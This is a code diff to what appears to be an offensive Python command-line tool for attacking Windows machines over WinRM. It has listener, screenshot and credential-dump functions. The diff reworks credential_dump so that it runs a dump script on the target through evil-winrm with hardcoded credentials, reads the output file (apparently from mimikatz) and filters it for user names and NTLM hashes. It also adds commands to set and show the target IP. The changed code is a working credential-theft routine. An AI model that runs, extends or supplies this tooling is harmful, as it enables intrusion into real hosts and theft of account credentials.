@@ -5,6 +5,7 @@ import getpass
 import platform
 import base64
 import time
+import ipaddress
 from datetime import datetime
 
 BANNER = r"""
@@ -132,17 +133,18 @@ def screenshot(target_ip):
         print("[-] Failed to save screenshot")
 
 def credential_dump(target_ip):
-    print("[*] Executing dump.cmd in the target and extracting results...")
+    print("[*] Executing dump.cmd in the target machine and extracting results...")
     try: 
-        payload = 'C:\\Users\\Public\\dump.cmd | Get-Content C:\\Users\\Public\\mimi_output.txt'
+        payload = "C:\\Users\\Public\\dump.cmd ; Get-Content C:\\Users\\Public\\mimi_output.txt | Select-String '(User\s*:|Hash NTLM:)'"
 
 
-        subprocess.run(
+        result = subprocess.run(
             ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
             input=payload,
             text=True,
             capture_output=True,
         )
+        print(result.stdout)
     except:
        print("[-] Failed to dump credentials") 
 
@@ -152,6 +154,8 @@ def cli():
     help_text = """
         Available commands:
         help, h        Show this help menu
+        set            Set a target IP address
+        show           Show current target
         listen         Start listening for a target
         check          Check target connectivity (WinRM ports)
         evil-winrm     Connect to target using evil-winrm
@@ -169,6 +173,17 @@ def cli():
 
         elif cmd == "help" or cmd == "h":
             print(help_text)
+        
+        elif cmd == "set":
+            args = input("Type target IP address: ")
+            try:
+                current_target = str(ipaddress.ip_address(args))
+                print(f"[+] Target IP set to {current_target}")
+            except ValueError:
+                print("[-] Invalid IP address")
+                
+        elif cmd == "show":
+            print(f"Current Target: {current_target}")
 
         elif cmd == "listen":
             current_target = start_listener()
